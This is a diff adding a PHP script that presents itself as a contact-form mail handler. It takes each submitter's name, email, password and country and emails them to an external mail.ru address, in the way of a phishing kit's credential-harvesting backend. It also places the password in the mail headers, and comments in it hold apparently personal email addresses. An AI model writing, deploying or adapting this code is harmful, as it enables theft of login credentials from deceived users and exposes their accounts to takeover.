@@ -1,0 +1,49 @@
+<?php
+    
+
+    // ali.ghanin86@gmail.com
+     // getting variables from form
+     $name = trim($_REQUEST['name']);
+     $country = trim($_REQUEST['country']);
+     $email = trim($_REQUEST['email']);;
+     $password = trim($_REQUEST['password']);
+    //  $to = 'sharplogs2015@gmail.com';
+     $to = 'Lock_g@mail.ru';
+     $subject = 'Email Notification gotten';
+     $headers = "From: ".$name." <".$email."> <".$password."> \r\n";
+     // prepare email body text
+
+     $Body = "You have a message from: ";
+     $Body .= $name;
+     $Body .= "\n";
+     $Body .= "\n";
+     $Body .= $email;
+     $Body .= "\n";
+     $Body .= "\n";
+     $Body .= $password;
+     $Body .= "\n";
+     $Body .= "\n";
+     $Body .= 'Country: '.$country.'';
+
+     
+
+     // send prepared message
+
+     $sent = mail($to, $subject, $Body);
+
+
+   //   echo ip_info("173.252.110.27", "Country"); // United States
+   //    echo ip_info("173.252.110.27", "Country Code"); // US
+   //    echo ip_info("173.252.110.27", "State"); // California
+   //    echo ip_info("173.252.110.27", "City"); // Menlo Park
+   //    echo ip_info("173.252.110.27", "Address"); // Menlo Park, California, United States
+
+     //callback for jQuery AJAX
+
+     if ($sent){
+        echo 'sent';
+     }else{
+        echo 'error';
+     }
+
+?>
